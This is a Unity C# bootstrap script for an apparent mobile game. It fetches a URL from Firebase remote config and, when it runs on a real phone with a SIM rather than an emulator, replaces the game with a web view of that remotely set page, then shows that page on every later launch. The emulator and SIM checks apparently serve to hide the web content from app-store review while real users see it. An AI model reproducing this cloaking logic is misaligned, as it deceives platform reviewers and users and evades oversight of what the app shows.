namespace App.Code
{
	using System.Collections;
	using App.Code.Audio;
	using App.Code.Game;
	using App.Code.Loader;
	using UnityEngine;

	public class Bootstrap : MonoBehaviour
	{
		[SerializeField] private GameView _gameView;
		[SerializeField] private GameService _gameService;
		[SerializeField] private GameSettings _gameSettings;
		[SerializeField] private AudioLibrary _audioLibrary;
		[SerializeField] private WebView _webView;
		[SerializeField] private GameObject _veil;

		[Header( "Debug" )]
		[SerializeField] private bool _clearPrefsWhenStart;
		[SerializeField] private bool _forceGameStart;
		
		private InternetStateService _internetStateService;
		private FirebaseRemoteConfigLoader _remoteConfigLoader;
		private FirebaseMediator _firebaseMediator;
		private PlayerPrefsSystem _playerPrefsSystem;
		private AudioController _audioController;

		private void Start()
		{
			_internetStateService = new InternetStateService();
			_remoteConfigLoader = new FirebaseRemoteConfigLoader();
			_firebaseMediator = new FirebaseMediator( _internetStateService, _remoteConfigLoader );
			_playerPrefsSystem = new PlayerPrefsSystem();
			_audioController = new AudioController( _audioLibrary, _gameService );

			#if UNITY_EDITOR
			if( _clearPrefsWhenStart )
				_playerPrefsSystem.DeletePlayerPrefs();
			#endif

			var prefsData = _playerPrefsSystem.Load();
			var hasInternet = _internetStateService.Check();

			HideVeil();

			_gameView.Init();
			_gameService.Construct( _gameView, _gameSettings );

			if ( _forceGameStart )
			{
				_gameService.Run();
				return;
			}

			if ( prefsData != null )
			{
				if ( hasInternet )
				{
					HideVeil();
					ShowWebView( prefsData.Url);
				}
				else
				{
					_gameView.ShowNoInternetWindow();
				}
			}
			else
			{
				StartCoroutine( WaitInitialization() );
			}
			
			/*
			 if ( hasInternet )
			{
				if ( prefsData != null )
				{
					HideVeil();
					ShowWebView();
				}
				else
				{
					StartCoroutine( WaitInitialization() );
				}
			}
			else
			{
				_gameView.ShowNoInternetWindow();
			}
			 */
			
		}

		private IEnumerator WaitInitialization()
		{
			_firebaseMediator.Initialize();

			var waiter = new WaitForSeconds( 0.1f );
			
			while ( _remoteConfigLoader.FbStatus != FirebaseRemoteConfigLoader.FirebaseStatus.IsReady )
				yield return waiter;

			HandleUrl();
		}

		private void HandleUrl()
		{
			var url = _firebaseMediator.ReadUrl();
			var urlIsEmpty = string.IsNullOrWhiteSpace( url );

			Debug.Log( $"Read url : {url}" );

			if ( urlIsEmpty || _webView.IsEmu() || _webView.GetSimStatus() == false ) 
			{
				HideVeil();
				_gameService.Run();
			}
			else
			{
				_playerPrefsSystem.Save( new PreferencesData() {Url = url} );
				HideVeil();
				ShowWebView( url );
			}
		}

		private void ShowWebView( string url )
		{
			Debug.Log( $"Show WebView on [{url}]" );
			_webView.StartWebPageAsync( url );
		}

		private void HideVeil()
		{
			_veil.SetActive( false );
		}
	}
}